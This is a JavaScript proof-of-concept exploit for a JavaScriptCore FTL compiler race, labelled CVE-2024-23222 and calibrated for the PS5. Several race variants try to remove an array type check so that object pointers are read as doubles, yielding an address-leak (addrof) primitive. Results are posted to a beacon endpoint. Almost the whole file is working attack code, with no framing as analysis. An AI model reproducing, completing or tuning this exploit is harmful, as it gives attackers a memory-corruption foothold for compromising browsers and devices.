/* p104-compilerrace — CVE-2024-23222 FTL compiler race
 *
 * THE BUG: TOCTOU between CFA and ConstantFolding in FTL background compiler.
 * - CFA calls tryGetConstantProperty → reads live heap → records narrow type
 * - Main thread does delete obj.p2 → structure transition
 * - ConstantFolding consults stale CFA valuesAtHead → removes CheckArray
 * - Result: DoubleArray read on what's actually ContiguousArray → addrof
 *
 * KEY: This is a COMPILER race, not a runtime type confusion.
 * The delete must happen DURING FTL background compilation.
 * Timing via loop iteration count (PIVOT), no SharedArrayBuffer needed.
 *
 * Requirements:
 * 1. Polymorphic IC (multi-entry set) so IC watchpoint doesn't fire on transition
 * 2. Phi merge point so CheckArray is in a different block than GetByOffset
 * 3. FTL threshold: ~100K+ calls
 * 4. PIVOT calibrated for PS5 AMD Zen 2 CPU speed
 *
 * Beacon prefix: V104H-
 */
(function(){
var RUN_ID = "v104h" + Math.random().toString(36).slice(2,12);
var PREFIX = "V104H-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press104-compilerrace");

/* Helper: extract raw bits from a double */
var _f64 = new Float64Array(1);
var _u32 = new Uint32Array(_f64.buffer);
function f2i(f) {
  _f64[0] = f;
  return [_u32[0], _u32[1]]; // [lo, hi]
}

/* One race attempt at a given PIVOT value.
 * Returns {confused: bool, leaked: number|undefined, ...}
 * Each attempt creates a FRESH function to get fresh JIT state.
 */
function attempt(PIVOT, attemptId) {
  var r = {pivot: PIVOT, id: attemptId};

  try {
    // 1. Create the array (DoubleArray)
    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

    // 2. Create two containers with DIFFERENT structures → polymorphic IC
    var c1 = {};
    c1.arr = arr;
    c1.pad = 42;  // Structure S1: {arr, pad}

    var c2 = {};
    c2.arr = arr;  // Structure S2: {arr} — no pad

    // 3. Hot function with branch → creates Phi merge for 'a'
    //    Two DIFFERENT parameters → compiler can't CSE the reads
    //    This ensures CheckArray is in the merge block, not the branch blocks
    function hot(obj1, obj2, flag) {
      var a;
      if (flag) {
        a = obj1.arr;
      } else {
        a = obj2.arr;
      }
      return a[0];
    }

    // 4. Warmup with BOTH structures → polymorphic inline cache
    //    FTL threshold ~1,000,000 calls (agent research confirms)
    var TOTAL = 1500000;
    var deleted = false;

    for (var i = 0; i < TOTAL; i++) {
      if (i & 1) {
        hot(c1, c1, true);
      } else {
        hot(c2, c2, false);
      }

      // 5. At PIVOT: delete c1.pad → structure transition S1→S2
      //    Must happen during FTL background compilation window
      //    No-op loops widen the race window (~47 per side per Coruna)
      if (i === PIVOT && !deleted) {
        var _nop = 0;
        for (var _n = 0; _n < 47; _n++) _nop += _n;
        delete c1.pad;
        for (var _n = 0; _n < 47; _n++) _nop += _n;
        deleted = true;
      }
    }
    r.loopDone = true;

    // 6. TEST: Transition array from DoubleArray to ContiguousArray
    //    by storing an object in it
    var marker = {mark: 0xBEEF};
    arr[0] = marker;

    // 7. Read through FTL-compiled code
    //    If CheckArray was removed → reads ContiguousArray as DoubleArray
    //    → object pointer bits interpreted as double → ADDROF!
    var result = hot(c1, c1, true);

    r.resultType = typeof result;

    if (typeof result === 'number') {
      // SUCCESS! We got a double from what should be an object
      r.CONFUSED = true;
      r.leaked = result;
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
      // On 64-bit JSC with NaN-boxing, the low 48 bits should be the address
      r.addr = '0x' + (bits[1] & 0xFFFF).toString(16) +
               ('00000000' + (bits[0] >>> 0).toString(16)).slice(-8);
    } else if (typeof result === 'object') {
      // No confusion — JSC correctly returned the object
      r.CONFUSED = false;
      r.isMarker = (result === marker);
    } else {
      r.CONFUSED = false;
      r.resultVal = String(result).slice(0, 30);
    }

    r.SURVIVED = true;
  } catch(e) {
    r.err = e.name + ":" + e.message.slice(0, 60);
  }

  return r;
}

/* ====== H1: Wide PIVOT sweep ====== */
function test_H1() {
  var pivots = [200000, 400000, 500000, 600000, 700000, 800000, 900000, 1000000, 1100000, 1200000];
  var results = [];

  for (var p = 0; p < pivots.length; p++) {
    var r = attempt(pivots[p], "H1-" + p);
    results.push(r);

    // If we found confusion, beacon immediately!
    if (r.CONFUSED) {
      B("H1-ADDROF-FOUND", r);
    }
  }

  // Summary
  var confused = results.filter(function(r) { return r.CONFUSED; });
  var summary = {
    total: results.length,
    confusedCount: confused.length,
    confused: confused.length > 0,
    pivotResults: results.map(function(r) {
      return r.pivot + ':' + (r.CONFUSED ? 'YES!' : 'no');
    }).join('|')
  };

  if (confused.length > 0) {
    summary.firstLeak = confused[0].leaked;
    summary.firstAddr = confused[0].addr;
  }

  B("H1-SWEEP", summary);
}

/* ====== H2: Repeated attempts at each PIVOT (statistical) ====== */
function test_H2() {
  // Some PIVOTs might work only occasionally (race timing)
  // Try the most likely range 5 times each
  var pivots = [600000, 800000, 1000000];
  var results = {};

  for (var p = 0; p < pivots.length; p++) {
    var pv = pivots[p];
    results[pv] = [];
    for (var rep = 0; rep < 3; rep++) {
      var r = attempt(pv, "H2-" + pv + "-" + rep);
      results[pv].push(r.CONFUSED ? 1 : 0);
      if (r.CONFUSED) {
        B("H2-ADDROF-FOUND", r);
      }
    }
  }

  var summary = {};
  for (var pv in results) {
    var hits = results[pv].reduce(function(a,b){return a+b;}, 0);
    summary[pv] = hits + '/5';
  }
  B("H2-STATS", summary);
}

/* ====== H3: Very high iteration count (deep FTL) ====== */
function test_H3() {
  var r = {};
  try {
    var arr = [1.1, 2.2, 3.3, 4.4];
    var c1 = {}; c1.arr = arr; c1.pad = 1;
    var c2 = {}; c2.arr = arr;

    // Much higher iteration count → ensure deep FTL
    function hot3(o1, o2, f) {
      var a;
      if (f) { a = o1.arr; } else { a = o2.arr; }
      var sum = 0;
      for (var j = 0; j < 10; j++) sum += a[j & 3];
      return sum;
    }

    var TOTAL = 2000000;
    var PIVOT = 1000000; // halfway — deep into FTL compilation window

    for (var i = 0; i < TOTAL; i++) {
      hot3(i & 1 ? c1 : c2, i & 1 ? c1 : c2, i & 1);
      if (i === PIVOT) delete c1.pad;
    }

    // Test
    var marker = {m: 0xDEAD};
    arr[0] = marker;
    var result = hot3(c1, c1, true);

    r.resultType = typeof result;
    if (typeof result === 'number' && result > 100) {
      r.CONFUSED = true;
      r.val = result;
      var bits = f2i(result / 10); // divided by 10 in the loop
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
    } else {
      r.CONFUSED = false;
      r.val = String(result).slice(0, 30);
    }
    r.SURVIVED = true;
    B("H3-DEEP-FTL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("H3-ERR", r); }
}

/* ====== H4: Alternative — valueOf race during comparison ====== */
function test_H4() {
  var r = {};
  try {
    // Different approach: use valueOf to trigger the structure transition
    // AT THE EXACT MOMENT the FTL function is being compiled
    var arr = [1.1, 2.2, 3.3, 4.4];
    var container = {}; container.arr = arr; container.pad = 1;
    var container2 = {}; container2.arr = arr;

    var transitionCount = 0;

    function hot4(c1, c2, flag, val) {
      var a;
      if (flag) { a = c1.arr; } else { a = c2.arr; }
      var x = val + 1; // triggers valueOf
      return a[0];
    }

    // Warmup with safe values
    for (var i = 0; i < 300000; i++) {
      hot4(i & 1 ? container : container2,
           i & 1 ? container : container2,
           i & 1, i);
    }
    r.warmupDone = true;

    // Now create evil valueOf that transitions structure
    var evil = {
      valueOf: function() {
        if (transitionCount === 0) {
          delete container.pad;
          transitionCount++;
        }
        return 42;
      }
    };

    // Call enough to potentially hit new FTL compilation
    for (var i = 0; i < 200000; i++) {
      hot4(container, container2, i & 1, i < 150000 ? i : evil);
    }

    // Test
    arr[0] = {leak: 0xCAFE};
    var result = hot4(container, container, true, 0);
    r.resultType = typeof result;
    if (typeof result === 'number') {
      r.CONFUSED = true;
      r.val = result;
    } else {
      r.CONFUSED = false;
    }
    r.transitions = transitionCount;
    r.SURVIVED = true;
    B("H4-VALUEOF-RACE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("H4-ERR", r); }
}

/* ====== H5: Worker-based compilation race ====== */
function test_H5() {
  var r = {};
  try {
    // Run the race in a Worker — isolated JIT context
    var workerCode = '(' + function() {
      var f64 = new Float64Array(1);
      var u32 = new Uint32Array(f64.buffer);

      function tryPivot(PIVOT) {
        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
        var c1 = {}; c1.arr = arr; c1.pad = 42;
        var c2 = {}; c2.arr = arr;

        function hot(o1, o2, flag) {
          var a;
          if (flag) { a = o1.arr; } else { a = o2.arr; }
          return a[0];
        }

        for (var i = 0; i < 1500000; i++) {
          hot(i & 1 ? c1 : c2, i & 1 ? c1 : c2, i & 1);
          if (i === PIVOT) delete c1.pad;
        }

        arr[0] = {mark: 48879};
        var result = hot(c1, c1, true);

        if (typeof result === 'number') {
          f64[0] = result;
          return {confused: true, lo: u32[0], hi: u32[1], val: result};
        }
        return {confused: false};
      }

      var pivots = [400000, 600000, 800000, 1000000, 1200000];
      var results = [];
      for (var p = 0; p < pivots.length; p++) {
        var r = tryPivot(pivots[p]);
        r.pivot = pivots[p];
        results.push(r);
        if (r.confused) break; // stop on first success
      }
      postMessage(results);
    }.toString() + ')()';

    var blob = new Blob([workerCode], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var w = new Worker(url);

    w.onmessage = function(e) {
      r.workerResults = e.data;
      var confused = e.data.filter(function(x){return x.confused;});
      r.anyConfused = confused.length > 0;
      if (confused.length > 0) {
        r.firstConfused = confused[0];
        B("H5-WORKER-ADDROF", r);
      }
      r.SURVIVED = true;
      w.terminate();
      URL.revokeObjectURL(url);
      B("H5-WORKER", r);
    };
    w.onerror = function(e) {
      r.workerErr = e.message ? e.message.slice(0,60) : 'error';
      B("H5-WORKER", r);
    };
    setTimeout(function() {
      if (!r.SURVIVED) { r.timeout = true; B("H5-WORKER", r); }
    }, 60000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("H5-ERR", r); }
}

/* ====== Run ====== */
try {
  test_H1();                     // Wide PIVOT sweep (0ms) — synchronous, fast
  setTimeout(test_H2, 30000);    // Repeated attempts (30s)
  setTimeout(test_H3, 50000);    // Deep FTL with inner loop (50s)
  setTimeout(test_H4, 70000);    // valueOf race variant (70s)
  setTimeout(test_H5, 90000);    // Worker-based race (90s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe104-done"); }, 180000);
})();
